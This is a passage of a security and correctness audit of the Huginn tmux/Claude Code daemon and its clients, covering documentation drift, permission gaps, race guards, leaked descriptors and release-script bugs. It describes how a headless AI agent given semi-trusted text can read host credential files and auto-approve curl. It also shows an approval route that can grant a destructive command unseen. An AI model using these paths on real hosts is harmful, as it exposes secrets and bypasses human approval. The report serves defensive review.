# Lane findings — full output
Every finding from the 20 finder lanes, after adversarial verification.
Findings the refuters killed are listed at the bottom rather than deleted, so the same wrong idea is not rediscovered next time.

**194 surviving findings**, 1 refuted.

---

# HIGH

### `../netplan/scripts/active/huginn-server/huginn-claude-title:63`

The netplan snapshot of huginn-claude-title — the copy the README designates as the DR-reproducible source of the live behaviour — is missing the entire /run/huginn-claude-state writer block, so restoring from it silently removes the only tmux-session-to-transcript mapping the phone and desktop clients have.

**lane** CLI client + server glue + provisioning (never audited) · **contract** C9 · **verdict** CONFIRMED by lead (L28) · **demonstrated by running it**

**What goes wrong:** LXC 117 is lost and rebuilt from the netplan repo per the README's stated purpose ("if LXC 117 were lost the working behaviour was not reproducible from any repo"). huginn-claude-title is restored from the netplan snapshot. Tab titles still work, so nothing looks broken — but no state file is ever written, readSessionState returns null for every session, `hasTranscript` is false everywhere, and the Huginn phone and desktop clients show every tmux session with an empty transcript and no thinking/tool/subagent rendering, permanently, with no error logged.

<details><summary>Evidence</summary>

```
diff /root/netplan/scripts/active/huginn-server/huginn-claude-title /opt/huginn/server/bin/huginn-claude-title shows 34 lines present only in the repo/live copy, the whole block from `STATE_DIR=/run/huginn-claude-state` through the `mv -f "$STATE_DIR/$sess.tmp" "$STATE_DIR/$sess"` / `rm -f` cleanup. The netplan file is dated Jun 18 22:39; the live and repo copies are byte-identical to each other (`diff /usr/local/bin/huginn-claude-title /opt/huginn/server/bin/huginn-claude-title` -> IDENTICAL).
That block is load-bearing: /opt/huginn-appd/huginn-appd.js:243 `fs.readFileSync(path.join(STATE_DIR, name))` in readSessionState is the sole producer of `sessionId`/`transcript`, and huginn-appd.js:238 comments it is "the only way to map a tmux session to its transcript".
The mirror's own README.md says: "Direction of truth: the LIVE /usr/local/bin copy wins. These files are snapshots of it... If you change a deployed bin, copy it here." — that rule was not followed for this file.
```

</details>

**Suggested fix:** Re-snapshot /usr/local/bin/huginn-claude-title into /root/netplan/scripts/active/huginn-server/ (and add a drift check to the nightly, since the README's manual 'copy it here' rule has already failed once for ~6 weeks).

### `docs/USAGE.md:14`

USAGE.md and FAQ.md tell the reader that `huginn -p` is "reasoning only (no tools)" and "safe for quick questions", but the CLI passes only `--allowedTools`, which the codebase itself has measured and documented as auto-approve-only — so `-p` can read any file on the host and can run Bash.

**lane** documentation drift and deployed-state drift · **verdict** CONFIRMED by lead (L29)

**What goes wrong:** An operator reads USAGE.md, concludes `huginn -p "summarise ~/.ssh/config"` is a read-free reasoning call, and wires `huginn -p` into a cron/bot fed by semi-trusted text. Claude Code grants Read/Glob/Grep with no rule present, so the prompt reads any file readable by root on huginn (including /etc/huginn-appd/token and ~/.claude/.credentials.json), and Claude Code's content-dependent safe-Bash classification auto-approves some `curl`/`cat` invocations — the exact coin flip the daemon measured one minute apart. The documented safety property does not exist.

<details><summary>Evidence</summary>

```
docs/USAGE.md:14 `| \`huginn -p "question"\` | one-shot **headless** query — reasoning only (no tools) |` and :73 `runs a single prompt and prints the answer (no tools — safe for quick questions)`.
client/huginn.sh:218-220 is the whole implementation:
```
      local tools="mcp__mempalace"
      [ "$mode" = "-y" ] && tools="Bash Read Edit Write Glob Grep WebFetch mcp__mempalace"
      ssh -T "$H" "... echo '$q' | claude -p --append-system-prompt \"\$P\" --allowedTools '$tools'; else echo '$q' | claude -p; fi"
```
There is no `--disallowedTools` on either branch. The daemon, solving the same problem, states the measured behaviour at server/appd/huginn-appd.js:99-114:
```
  // --allowedTools AUTO-APPROVES; it does not restrict. In -p mode the read-only
  // tools (Read/Glob/Grep) are allowed by default with no grant at all — VERIFIED
  // 2026-07-28 by having an ask chat read /etc/hostname with no Read rule present.
...
const DISALLOWED = { ask: 'Bash Edit Write NotebookEdit', act: '' };
```
and huginn-appd.js:97 claims `// Tool sets mirror the huginn CLI exactly` — they do not: appd adds the deny half, the CLI has none. `/usr/local/share/huginn-cli/persona.md` exists on this host, so the `--allowedTools` branch is the live one.
```

</details>

**Suggested fix:** Either make the doc true — add `--disallowedTools 'Bash Edit Write NotebookEdit'` to the `-p` branch of client/huginn.sh and huginn.ps1, mirroring huginn-appd.js's DISALLOWED.ask — or rewrite USAGE.md:14/:73 and FAQ.md:33-34 to say `-p` denies mutation but still reads the host. Also fix FAQ.md:34, which lists the `-y` allowlist without `mcp__mempalace`.

### `mobile/README.md:149`

mobile/README states huginn-appd "binds huginn's Tailscale address only" and that "the tailnet is the network boundary"; the running daemon has bound 0.0.0.0 since 2026-07-29 and is reachable from both server VLANs.

**lane** documentation drift and deployed-state drift · **verdict** CONFIRMED by lead (L30) · **demonstrated by running it**

**What goes wrong:** Someone auditing exposure, or deciding whether the bearer token needs rotating after a LAN incident, reads the README and concludes 8787 is unreachable except over the tailnet. In fact any host on 192.168.2.0/24 or 192.168.7.0/24 that can reach 192.168.2.117:8787 gets the full root-equivalent API surface if it has the token, and an unauthenticated attacker on the LAN can at minimum enumerate the service. The stated network boundary is one the deployment does not have.

<details><summary>Evidence</summary>

```
mobile/README.md:149-153: "`huginn-appd` binds **huginn's Tailscale address only** (`tailscale ip -4`) on port **8787** ... everything the daemon exposes is equivalent to root on huginn, so the tailnet is the network boundary and the token is the authorization one."
Ran `ss -lntp | grep 8787`:
```
LISTEN 0 511  0.0.0.0:8787  0.0.0.0:*  users:(("node",pid=2373937,fd=22))
```
`systemctl show huginn-appd -p Environment` -> `NODE_ENV=production HOME=/root HUGINN_APPD_BIND=0.0.0.0`, from /etc/systemd/system/huginn-appd.service.d/override.conf (dated Jul 29), which huginn-appd.js:3149 honours before the `tailscale ip -4` path at :3152. The drop-in's own comment says it is deliberate (Yggdrasil LAN gateway) — only the README was never updated. The drop-in also justifies itself with "so server/appd/deploy.sh rewriting the unit cannot silently revert it", but deploy.sh never touches the unit at all.
```

</details>

**Suggested fix:** Update mobile/README.md:149-153 to describe the real posture (0.0.0.0 by the systemd drop-in; tailnet + Yggdrasil LAN gateway are both in scope; the bearer token is the only boundary), and add the same fact to docs/SECURITY.md. Correct the stale sentence in override.conf about deploy.sh rewriting the unit.

### `mobile/app-desktop/packaging/huginn-desktop-kt.nsi:161`

The NSIS installer never stamps the AUMID onto the Start Menu shortcut, which the app's own source says is mandatory for Windows toasts — so the packaged Windows client posts notifications that Windows silently discards, and it never fails over to the tray balloon because the discard is not an error.

**lane** :app-desktop (Compose Desktop shell) — correctness, security, lifecycle · **contract** C7 · **verdict** CONFIRMED by lead (L10) · **demonstrated by running it**

**What goes wrong:** Owner installs Huginn Desktop (Compose) 0.3.1 on PRESTIGE from the shipped NSIS installer and launches it. WindowsToastNotifier.createOrNull passes (packaged=true; the probe only calls CreateToastNotifier(aumid), which does not validate against installed shortcuts), so `windows-toast` becomes the primary notifier and Settings/diagnostics report "desktop notifier windows-toast". A tmux session then hits a tool-approval prompt; the watch digest fires NotifyDecision.Attention, the toast XML is built with answer buttons, PowerShell exits 0 — and no toast ever appears on screen. Meanwhile the client IS claiming the notification route (canNotifyProvider = notifyEnabled && present, AppStore.kt:61), so the daemon holds back the household Telegram fallback. Net result: the session blocks on a human, the desktop shows nothing, Telegram is suppressed, and every surface reports healthy.

<details><summary>Evidence</summary>

```
The installer creates the shortcut with no AppUserModelID property:

  161:  CreateShortCut "$SMPROGRAMS\${APP_NAME}\${APP_NAME}.lnk" "$INSTDIR\${APP_EXE}"

The requirement is stated by the code that depends on it, WindowsToastNotifier.kt:24-30:

  * 1. **An AUMID that matches an installed Start Menu shortcut.** Windows files a
  *    toast under the calling application's identity, and drops it on the floor —
  *    silently, no error — when that identity matches no shortcut. This is the
  *    exact reason no notification ever appeared in the Electron client's field
  *    use before `setAppUserModelId` was added. The NSIS installer must stamp
  *    [AUMID] onto the shortcut it creates; nothing this process does at runtime
  *    can substitute for that.

Ran: `grep -rn -i "AppUserModel|AUMID|WinShell|SetLnk" mobile/ scripts/ desktop/` — every hit inside mobile/ is a comment or the constant itself in WindowsToastNotifier.kt; the only real stamping in the repo is desktop/src/main/index.ts:31 `app.setAppUserModelId('com.silencelen.huginn.desktop')`, which is the ELECTRON client using an Electron runtime API the JVM does not have. Nothing in mobile/app-desktop/packaging, mobile/scripts/release-desktop.sh or SchemeRegistrar.kt writes System.AppUserModel.ID.

The fail-closed claim (WindowsToastNotifier.kt:38-41 "Everything here fails CLOSED... a failure marks the backend dead so the next notification takes the AWT balloon path") does not hold for this failure: post() only sets `failed` when the PowerShell exit code is non-zero (line 88 `if (!ok) failed = true`), and the script's `Show($toast)` returns normally when the AUMID is unknown, so exit code 0. FallbackNotifier.active() (Notifiers.kt:21) therefore keeps returning the toast notifier forever.
```

</details>

**Suggested fix:** Stamp the AUMID on the shortcut at install time. NSIS cannot do it with CreateShortCut alone — use the WinShell plugin (`WinShell::SetLnkAUMI "$SMPROGRAMS\${APP_NAME}\${APP_NAME}.lnk" "com.silencelen.huginn.desktop-kt"`) or write the .lnk's IPropertyStore via a small helper, and add a release gate that reads the property back off the built shortcut. Until that lands, make the failure detectable rather than silent: have the PowerShell 'show' branch verify the AUMID resolves (e.g. check for a Start Menu shortcut carrying it) and exit non-zero when it does not, so `failed` is set and FallbackNotifier drops to the AWT balloon on the second notification.

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/ui/ChatView.kt:353`

Both composers clear the draft synchronously and then post the message from a coroutine on the VIEW's scope, so navigating away while an attachment upload is still settling silently destroys the typed message — the draft is already gone and the POST is never issued.

**lane** :app-desktop (Compose Desktop shell) — correctness, security, lifecycle · **verdict** CONFIRMED by lead (L33)

**What goes wrong:** Owner opens chat X, drags a 40 MB log file onto the composer (upload starts, chip shows UPLOADING), types "read this and tell me what broke", presses Ctrl+Enter. The composer empties and the draft key is deleted from settings.json. While the upload is still in flight he presses Ctrl+2 to glance at Sessions (Ctrl-chords are deliberately not suppressed while typing). ChatView leaves the composition, rememberCoroutineScope is cancelled inside `attachments.take()`, `onSend` never runs. No message is posted, no error is shown, the draft is gone, and the transcript looks exactly as if he never typed it.

<details><summary>Evidence</summary>

```
ChatView.kt:350-360 (chat composer):

  val submit: () -> Unit = {
      if (canSend) {
          val body = draft
          onSent()                        // <- clears the draft NOW
          scope.launch {                  // <- scope = rememberCoroutineScope()
              val marker = attachments.take()   // <- suspends up to 20s
              val full = composeMessage(body, marker)
              if (full.isNotEmpty()) onSend(full)
          }
      }
  }

SessionView.kt:788-798 is the same shape with `viewScope` and `controller.sendLine(full)`.

`onSent` is not a debounced write — core/DraftBook.kt:

  fun clear(key: String) {
      if (!_drafts.value.containsKey(key)) return
      put(key, "")      // removes the key from the in-memory map
      writeNow()        // cancels the pending save and persists immediately
  }

`take()` is the long suspension — AttachmentController.kt:144-156 joins the upload job under `withTimeoutOrNull(SETTLE_TIMEOUT_MS)` with `const val SETTLE_TIMEOUT_MS: Long = 20_000`.

The scope is the composition's: ChatView.kt:109 `val scope = rememberCoroutineScope()`, and ChatView is composed only inside Shell.kt:218-232 `View.CHATS -> { val open = chatId; if (open != null) ChatView(store.client, open) }` — so leaving the Chats view, or Esc closing the chat, disposes it and cancels the scope. In SessionView the same disposal path also runs `controller.close()` (SessionView.kt:122-128 -> SessionController.kt:160-163 `job.cancel()`), so even a surviving viewScope cannot deliver: `sendLine` launches on the controller's already-cancelled scope and is a silent no-op.

Note the contrast with the code right beside it: ChatView.kt:154 deliberately routes the post-delete refresh onto `store.scope` "because Closing the view is the same frame that cancels the effect" — the send path did not get the same treatment.
```

</details>

**Suggested fix:** Run the send on a scope that outlives the view, the same way the draft book and the pane lease already do: pass `store.scope` (or a small app-level Sender) into both composers and launch the take()+send there, keying nothing on the composition. Belt and braces: only call `onSent()` once the post has actually been accepted, or restore the draft in a `catch (CancellationException)` / `invokeOnCompletion` so a cancelled send puts the text back rather than dropping it.

### `mobile/scripts/release-desktop.sh:95`

The version gate refuses only a version EQUAL to the live one, so publishing a LOWER version is allowed — and step 6's prune then deletes the artifacts step 5 just staged, leaving /v1/desktop-kt serving a manifest whose downloads 404 for every client.

**lane** packaging and release — mobile/scripts/{build,ship,release-desktop}.sh, app-desktop/packaging/huginn-desktop-kt.nsi, app-desktop/build.gradle.kts (packaging config), desktop/scripts/release.sh + electron-builder.yml · **contract** C3 · **verdict** CONFIRMED by lead (L31) · **demonstrated by running it**

**What goes wrong:** Channel is at 0.3.1 (live now). Someone checks out an older commit / reverts app-desktop/version.txt to 0.2.9 (or mistypes 0.3.2 as 0.2.9) and runs scripts/release-desktop.sh. The gate passes because 0.2.9 != 0.3.1. Build + wine install succeed. Step 5 atomically installs the 0.2.9 deb, exe and manifest.json into /var/lib/huginn-appd/desktop-kt. Step 6 prunes 0.2.9 as the third-newest version, deleting both files it just staged. Step 7 fails and the script exits 1 — but the 0.3.1 manifest has already been overwritten and is not restored. From that moment /v1/desktop-kt/manifest advertises 0.2.9; a Compose client on 0.2.8 downloads huginn-desktop-kt_0.2.9-1_amd64.deb and gets a 404, and no client can ever be offered 0.3.1 again because the manifest that named it is gone. Recovery requires a full re-release.

<details><summary>Evidence</summary>

```
Gate (line 95): `if [ "$LIVE" = "$VERSION" ]; then echo "REFUSING: $VERSION is already live..."` — equality only, no `<` comparison.
Prune (line 362): `const doomed = new Set([...vers].sort(cmp).slice(keep))` with `KEEP=2` (line 36) — doomed is every version outside the two HIGHEST, which includes a freshly-staged lower one.
Order is stage(step 5) -> prune(step 6) -> verify(step 7), so the manifest is already live when the prune runs.
RAN the prune body verbatim in a scratch dir seeded with the real channel's 0.3.1 + 0.3.0 plus a just-staged 0.2.9:
  BEFORE: huginn-desktop-kt_{0.2.9,0.3.0,0.3.1}-1_amd64.deb, Huginn-Desktop-Setup-{0.2.9,0.3.0,0.3.1}.exe, manifest.json
  ->  pruned Huginn-Desktop-Setup-0.2.9.exe
  ->  pruned huginn-desktop-kt_0.2.9-1_amd64.deb
  AFTER: manifest.json SURVIVES, both 0.2.9 artifacts GONE.
The daemon serves manifest.json verbatim (server/appd/lib/desktop.js readManifest) and 404s a missing artifact — confirmed live read-only: `/v1/desktop-kt/huginn-desktop-kt_0.2.9-1_amd64.deb` -> HTTP=404 while the 0.3.1 deb -> HTTP=200.
```

</details>

**Suggested fix:** Make the gate a semver comparison, not an equality: refuse when the built VERSION is not strictly greater than LIVE. Independently, make the prune never delete a version named by the manifest it just staged (compute `doomed` as `vers minus {manifest.version} minus top-(keep-1)`), and move the prune AFTER the step-7 wire verification so a failed verify leaves the channel exactly as it was.

### `mobile/ui/src/commonMain/kotlin/com/silencelen/huginn/ui/Follow.kt:77`

FollowNewest's follow latch can only be broken by DragInteraction, which mouse-wheel scrolling never emits, so on desktop a live conversation force-scrolls the reader back to the tail and cannot be read while a run is streaming.

**lane** :ui shared composables — usability, state latches, and owner taste · **verdict** CONFIRMED by lead (L17) · **demonstrated by running it**

**What goes wrong:** Owner opens a chat or session on the desktop while a turn streams (revision changes on every token/poll tick), scrolls up with the mouse wheel or trackpad to re-read an earlier answer -> no DragInteraction fires, `following` stays true, the next Delta/poll (~every token / 2.5s) jumps the list back to the bottom; text selection in the SelectionContainer is torn up mid-drag too. The NewestPill can never appear on desktop for the same reason (unseen requires !following). This is the exact 'conversation that cannot be read while it is live' failure the latch was built to prevent, reintroduced for desktop's primary scroll input.

<details><summary>Evidence</summary>

```
Follow.kt: `is DragInteraction.Start -> following = false` is the ONLY unlatch; while `following` every revision runs `listState.scrollToNewest(...)`. Proved against the pinned dependency (compose-multiplatform 1.7.3, libs.versions.toml): `javap -p -c` over foundation-desktop-1.7.3.jar shows androidx.compose.foundation.gestures.MouseWheelScrollNode* contains ZERO references to any interaction class (grep count 0), while DragGestureNode is the class that constructs DragInteraction$Start/Stop/Cancel — i.e. the wheel path bypasses the interactionSource entirely. Consumers: ChatView.kt:186 FollowNewest(revision = tailRevision(..., partial.length, ...)) and SessionView.kt:405.
```

</details>

**Suggested fix:** Break the latch on any user-initiated scroll away from the tail: pass a shell-supplied unlatch signal into FollowNewest (e.g. Modifier.pointerInput observing PointerEventType.Scroll on the list sets following=false when the delta is negative), or set an internal 'programmatic' flag around scrollToNewest and unlatch in the snapshotFlow when isAtTail() goes false without that flag set.

### `server/appd/deploy.sh:10`

The only sanctioned way appd code reaches production runs zero tests — `node --check` (syntax only) is the entire gate, so the 385-test suite can be fully red and the daemon still deploys.

**lane** test coverage map — find the next TermKeys · **contract** C11 · **verdict** CONFIRMED by lead (L32) · **demonstrated by running it**

**What goes wrong:** An engineer edits lib/clients.js so `appOnline()` always returns false, runs `server/appd/deploy.sh` (which the file header calls "the only sanctioned way bits get there"), and the daemon restarts healthy — `/v1/ping` returns ok:true so deploy.sh's own check passes. Five existing tests describe exactly this defect and none of them ran. Live effect: `appOnline` is what decides the Telegram fallback (lib/clients.js header), so every alert now double-delivers to push AND Telegram, which the module header names as the failure that teaches the reader to ignore both channels. The bug survives until someone happens to build an APK.

<details><summary>Evidence</summary>

```
deploy.sh in full:
  node --check "$SRC/huginn-appd.js"
  install -m 0644 "$SRC"/lib/*.js "$DEST/lib/"
  systemctl restart huginn-appd
No `node --test` anywhere in server/ or provision/ (`grep -rn "node --test" server/ provision/` returns only two comments inside lib/pane.js and test/pane.test.js). There is no CI: /opt/huginn/.github contains only ISSUE_TEMPLATE and PULL_REQUEST_TEMPLATE.md, no workflows/ dir. The suite is invoked from exactly two places, both of which build a CLIENT, not the server: mobile/scripts/build.sh:91 (APK build) and mobile/scripts/release-desktop.sh:135 (desktop release).
RAN (demonstration): copied appd to a scratch dir, injected `return false;` as the first line of `appOnline()` in lib/clients.js, then ran both gates:
  node --check $S/huginn-appd.js   -> EXIT=0   (deploy.sh would proceed)
  node --test $S/test/clients.test.js -> EXIT=1, `# tests 14 / # pass 9 / # fail 5`
```

</details>

**Suggested fix:** Add the same gate release-desktop.sh already uses to deploy.sh, before `install`: run `node --test "$SRC"/test/*.test.js > log 2>&1; echo EXIT=$?`, assert EXIT=0 and assert `# pass` >= a floor (currently 385). Not piped — redirect and check, as release-desktop.sh:135 does.

### `server/appd/huginn-appd.js:1723`

The enabled autoswitcher cannot fire in the deployed store: both non-active accounts have no lastPlan snapshot and expired access tokens, so both candidates price as 'no numbers' and decideSwitch has nothing to switch to — the exact symptom the 2026-08-03 fix targeted persists as a bootstrap deadlock.

**lane** lib/accounts.js + lib/autoswitch.js + lib/usage.js + lib/plan.js — account identity and switching · **verdict** CONFIRMED by lead (L13) · **demonstrated by running it**

**What goes wrong:** The active account (79c777a4-...) crosses 95% tonight with autoswitch enabled: tick prices both candidates as unknown, decideSwitch returns null, idleBecause says 'no headroom known for any of the 2 other account(s)' — which no UI shows — and the owner hits the hard stop the feature exists to prevent. Heals only after each account is MANUALLY activated once (with autoswitch enabled) so recordPlan can run for it.

<details><summary>Evidence</summary>

```
RAN IT: live GET /v1/autoswitch -> {"enabled":true,"switches":0,...}; live GET /v1/accounts shows planSeenAt:null on e12d3fa9-... and 964aefae83ccf2ba; store files confirm lastPlan absent and accessExpiresAt 2026-07-27/28 (both < now). Code path: planForCredentials returns null for expired tokens (line 1207), line 1723 falls back to `agedLimits(rec.lastPlan)` = agedLimits(null) = [], autoswitch.js:91 `if (!cw) continue; // no numbers: not a candidate`. lastPlan is only written by recordPlan while an account is ACTIVE (lines 1698/1719/2348) — and being activated is exactly what the switch would grant. Neither candidate has been active since fe6e445 shipped (savedAt Jul 27/28). No client consumes the self-diagnosis: `idleBecause` appears nowhere in mobile/ or desktop/ (Kotlin Autoswitch model has only enabled/switches/last/accounts).
```

</details>

**Suggested fix:** On performSwitch success, immediately planForCredentials(new active) + recordPlan to bootstrap each account at first activation; notify (push/Telegram) when the threshold is crossed but zero candidates are priced ('would switch, cannot — activate X once to price it'); expose idleBecause in both clients; short-term: owner cycles through all three accounts once.

### `server/appd/huginn-appd.js:2463`

The sign-in duplicate check excludes the new account's record by fingerprint-slug, but records are now uuid-keyed, so every successful NEW-account sign-in matches its own just-saved record and returns duplicate:true.

**lane** lib/accounts.js + lib/autoswitch.js + lib/usage.js + lib/plan.js — account identity and switching · **contract** C8 · **verdict** CONFIRMED (CONFIRMED:3) · **demonstrated by running it**

**What goes wrong:** Owner adds his third Max account from the phone: pastes the code, sign-in succeeds, credentials change, saveIdentified files it under its uuid -> POST /v1/account/login/code returns {done:true, duplicate:true} -> the dialog says 'That is the same account' for an account that is genuinely new. The flag is now true on real duplicates AND on every success, so the check built to catch same-account re-auth distinguishes nothing.

<details><summary>Evidence</summary>

```
Line 2463: `const others = accounts.list().filter((a) => a.slug !== fingerprint(live));` — but line 2455's `saveIdentified` just filed the new login under its accountUuid (C8 ladder), so no slug equals fingerprint(live) and the new account's own record stays in `others`, where `resolveEmail(rec.credentials)` (same live token, cached in idByPrint) returns the captured email and pushes its own slug into dupSlugs. RAN IT: repro with the real AccountStore (dup-repro.js) printed `dupSlugs: ["22222222-..."]  duplicate flag returned to the app: true  BUG CONFIRMED`. git confirms the filter predates commit fe6e445 ('an account is a uuid, not a refresh token'), which did not touch it. Client impact: mobile SignInDialog.kt:62 `finished && state.duplicate -> "That is the same account"`; HuginnViewModel.kt:839 keeps the dialog open on duplicate; desktop SettingsView.kt:335 same.
```

</details>

**Suggested fix:** Capture the slug: `const newSlug = live ? await saveIdentified(...) : null;` then filter `(a) => a.slug !== newSlug && a.slug !== fingerprint(live)` (fingerprint kept for the offline/unresolved fallback). Add a route-level test: new uuid-keyed account -> duplicate:false; re-signed same account -> duplicate:true.

### `server/appd/huginn-appd.js:2685`

The rename route accepts a session name containing '.', which tmux silently rewrites to '_' while still exiting 0, so the daemon moves the session's state file to a name no live session has — orphaning the tmux-session-to-Claude-transcript mapping and returning a session name that does not exist.

**lane** command and tmux injection in appd · **verdict** CONFIRMED by lead (L8) · **demonstrated by running it**

**What goes wrong:** Owner finishes a session named `audit` and renames it from the phone to `audit.v2` to file it. The daemon answers 200 {name:"audit.v2"}; tmux actually holds `audit_v2`. The app now addresses `/v1/sessions/audit.v2/...` and gets 404 on every route, so the session it just renamed disappears from the app entirely; meanwhile `/run/huginn-claude-state/audit.v2` holds the only record of that session's transcript path and session id, and the real session `audit_v2` reports hasTranscript:false with no conversation view until someone types a new prompt into it.

<details><summary>Evidence</summary>

```
NAME_RE at :225 permits a dot: `const NAME_RE = /^[A-Za-z0-9_][A-Za-z0-9_.-]{0,49}$/;` (its comment only reasons about '/' and path traversal, not about tmux's own name rules). The route trusts tmux's exit code:

```js
2685: const r = await run('tmux', ['rename-session', '-t', `=${from}`, to]);
2686: if (r.err) return sendErr(res, 404, `tmux: ...`);
2688: try { fs.renameSync(path.join(STATE_DIR, from), path.join(STATE_DIR, to)); } catch { }
2689: if (leases.has(from)) { leases.set(to, leases.get(from)); leases.delete(from); }
2690: return sendJson(res, 200, { ok: true, name: to });
```

RAN IT — tmux 3.6b rewrites the name and reports success:
```
$ tmux rename-session -t '=audit-inj-ren' 'audit-inj.renamed'; echo RENAME_EXIT=$?
RENAME_EXIT=0
$ tmux list-sessions -F '#{session_name}' | grep audit-inj
audit-inj_renamed
$ tmux has-session -t '=audit-inj.renamed'; echo HAS_EXIT=$?
can't find window: audit-inj
HAS_EXIT=1
```

RAN IT against the LIVE daemon on a scratch session I created:
```
BEFORE: ls /run/huginn-claude-state | grep audit-inj  ->  audit-inj_v2
$ curl -X POST .../v1/sessions/audit-inj_v2/rename -d '{"name":"audit-inj.v3"}'
{"ok":true,"name":"audit-inj.v3"}
AFTER: tmux really has          ->  audit-inj_v3
AFTER: ls /run/huginn-claude-state -> audit-inj.v3      (orphan; no session by that name)
$ curl .../v1/sessions/audit-inj_v3/transcript
{"error":"no transcript recorded for this session yet — the Claude hook fires on the first prompt"}  HTTP 409
```
/opt/huginn/server/bin/huginn-claude-title:60 keys the state file off the LIVE `#{session_name}`, so the mapping only returns on that session's next Claude event — a session renamed while idle (the normal reason to rename) stays transcript-less indefinitely, and the orphaned dotted file is never cleaned up. The lease re-key at :2689 is also filed under the non-existent name, so `leases.has(realName)` is false and `releaseSize(realName)` finds nothing (C6's per-session release path misses it; only the windowId-based sweep recovers).
```

</details>

**Suggested fix:** Drop '.' from NAME_RE (tmux forbids '.' and ':' in session names, so allowing it can only ever produce divergence), and belt-and-braces: after new-session/rename-session, read the real name back with `tmux display-message -p -t <id> '#{session_name}'` and use THAT for the state-file move, the lease key and the response body.

### `server/appd/huginn-appd.js:2754`

The /answer route's prompt fingerprint check is opt-in — omitting the field (or sending null) skips the entire check-and-act race guard the route exists to provide, and the digit is typed into whatever prompt is on screen now.

**lane** command and tmux injection in appd · **verdict** CONFIRMED by lead (L1) · **demonstrated by running it**

**What goes wrong:** A lock-screen notification offers "1) Yes  2) No" for "Run the test suite?". The owner's phone is in a pocket for 20 minutes; the session meanwhile answers itself and reaches a different permission dialog — "1. Yes  2. Yes, and don't ask again  3. No" for a destructive Bash command. The owner taps the stale notification. If the answer payload carries no fingerprint (a client that never persisted it across the notification round-trip, an app restart that dropped it, or a hand-built request), the daemon types `2` + Enter into the live pane, granting "yes, and don't ask again" on a command the owner never saw — exactly the outcome the route was written to prevent, and the 200 response tells the client it answered the original question.

<details><summary>Evidence</summary>

```
```js
2754: if (body.fingerprint && body.fingerprint !== live) {
2755:   return sendJson(res, 409, { ok: false, reason: 'changed', ... });
2760: }
```
A falsy fingerprint short-circuits the comparison. The route's own 10-line header comment (:2721-2730) states the requirement it then fails to enforce: "a bare digit lands somewhere it was never meant to, and in a Claude Code pane that can accept a prompt the owner never saw. So the fingerprint of the question being answered comes with the answer, and a mismatch is refused rather than delivered hopefully."

RAN IT against the LIVE daemon on a scratch tmux session I created rendering a Claude-style selector (the daemon detected it and issued fingerprint a794e786e734):
```
A) curl -X POST .../v1/sessions/audit-inj-answer/answer -d '{"option":2}'
   {"ok":true,"option":2,"label":"Yes, and do not ask again"}   HTTP 200
   keystrokes delivered to the pane: [2$]
B) ... -d '{"option":3,"fingerprint":"deadbeefcafe"}'   (control)
   {"ok":false,"reason":"changed",...}                          HTTP 409   (nothing delivered)
C) ... -d '{"option":1,"fingerprint":null}'
   {"ok":true,"option":1,"label":"Yes"}                         HTTP 200
   keystrokes delivered: [2$1$]
```
Only the residual `prompt.options.find(o => o.number === option)` check survives, which degrades the guarantee from "the question you were shown" to "some question with an option of that number". The daemon is the only layer that can enforce this — the Electron client's forgeable `huginn://answer` was fixed client-side in 0.2.0, leaving the server still accepting fingerprint-less answers from any caller holding the bearer token.
```

</details>

**Suggested fix:** Require the fingerprint: `if (!body.fingerprint || body.fingerprint !== live) return 409 {reason:'changed'|'missing', prompt, fingerprint: live}`. Every legitimate caller already has it — captureScreen ships `prompt.fingerprint` with the prompt (:594-597) precisely so the client never computes it itself.

### `server/appd/huginn-appd.js:2836`

serveDesktopArtifact leaks one permanently-open file descriptor for every release-artifact download the client aborts, because nothing destroys the ReadStream when the response closes early.

**lane** lib/uploads.js + lib/desktop.js — upload spool and release-artifact serving · **verdict** CONFIRMED by lead (L12) · **demonstrated by running it**

**What goes wrong:** The owner's desktop client polls /v1/desktop and auto-downloads a 116 MB AppImage (updater.ts:50 `autoUpdater.autoDownload = true`). Home wifi drops, or the user quits the app mid-download, or the daemon's 116 MB transfer is cut by the tailnet. Each such interruption leaves one fd open in the root daemon plus up to a 64 KB highWaterMark buffer, forever. Secondary and worse: the release scripts prune to KEEP=2, so `release.sh` unlinking huginn-desktop-0.3.0.AppImage while 40 stale fds still reference it leaves 116 MB unreclaimable on a filesystem already at 80% (12 G free) until huginn-appd is restarted — `df` shows the space gone with no file to point at. My own 55-abort probe has left 42 such fds in the running daemon right now; they will clear on the next restart.

<details><summary>Evidence</summary>

```
Code (huginn-appd.js:2835-2837):
      const stream = fs.createReadStream(found.file);
      stream.pipe(res);
      stream.on('error', () => { try { res.destroy(); } catch { } });
There is no `res.on('close', () => stream.destroy())` and no `pipeline()`. Node's `pipe()` only unpipes on destination close; an fs.ReadStream that never reaches 'end' or 'error' is never autoClosed.

RAN against the LIVE daemon (read-only GETs, aborted):
  PID=2373937
  # 15 aborted GETs of Huginn-Setup-0.3.0.exe  -> fds 24 -> 26
  # then 40 aborted GETs of huginn-desktop-0.3.0.AppImage:
  after 40 aborts: 42
  after +30s idle: 42
  $ ls -l /proc/2373937/fd | grep 'huginn-appd/desktop' | awk '{print $NF}' | sort | uniq -c
       40 /var/lib/huginn-appd/desktop/huginn-desktop-0.3.0.AppImage
        2 /var/lib/huginn-appd/desktop/Huginn-Setup-0.3.0.exe
The descriptors do not close on idle; they persist for the daemon's lifetime.
```

</details>

**Suggested fix:** Replace the manual pipe with `stream.pipe(res); res.on('close', () => stream.destroy());` or, better, `require('stream').pipeline(stream, res, () => {})`, which destroys the source on any destination close/error.

### `server/appd/huginn-appd.js:3202`

huginn-appd.js — 3202 lines, ~70 top-level functions and 28 `/v1/*` route branches — has no module.exports, no `require.main` guard and no test file, so every one of those functions is untestable by construction and none is tested.

**lane** test coverage map — find the next TermKeys · **verdict** CONFIRMED by lead (L9) · **demonstrated by running it**

**What goes wrong:** A change to `validKey`'s NAMED_KEYS set (e.g. dropping 'IC' during a cleanup) passes `node --check`, deploys, and every keystroke batch containing Insert returns 400 — and because the client coalesces a burst into ONE request, the whole batch is lost, not just the Insert. That is the documented history at huginn-appd.js:622. Nothing in either test suite would go red: the only assertion about NAMED_KEYS lives in a Kotlin test that hard-copies the set (see the TermKeysTest finding).

<details><summary>Evidence</summary>

```
`grep -n "module.exports\|require.main" huginn-appd.js` -> no matches. The file's tail is unconditional startup:
  resolveBind().then(async (bind) => { ... server.listen(PORT, bind, ...) })
